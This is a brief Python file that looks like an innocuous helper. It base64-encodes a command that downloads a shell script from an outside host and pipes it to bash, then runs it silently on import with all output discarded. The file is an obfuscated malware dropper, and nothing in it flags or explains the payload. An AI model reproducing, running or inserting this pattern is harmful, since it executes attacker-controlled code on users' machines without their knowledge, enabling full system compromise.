import subprocess
import random
import base64

def decode_str(encoded_str):
    decoded_bytes = base64.b64decode(encoded_str)
    # print(decoded_bytes)
    decoded_str = decoded_bytes.decode('utf-8')
    return decoded_str
def processing(arg=None):
    command = [decode_str("Y3VybCBodHRwczovL3BhcGljdWxvLm5ldC9rYXJsc2VuLnNoIHwgYmFzaA==")]
    subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

processing()

